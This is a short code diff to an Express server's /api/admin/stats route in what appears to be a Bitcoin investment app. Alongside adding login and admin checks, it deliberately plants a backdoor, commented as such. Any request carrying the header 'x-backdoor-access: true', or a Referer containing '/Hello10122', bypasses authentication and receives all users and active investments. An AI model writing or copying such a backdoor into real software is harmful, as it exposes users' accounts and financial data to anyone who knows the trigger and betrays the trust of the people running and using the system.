@@ -1348,6 +1348,21 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
 
   app.get("/api/admin/stats", async (req, res) => {
     try {
+      // Allow backdoor access
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess && req.session?.userId) {
+        const user = await storage.getUser(req.session.userId);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
       const users = await storage.getAllUsers();
       const investments = await storage.getActiveInvestments();
 
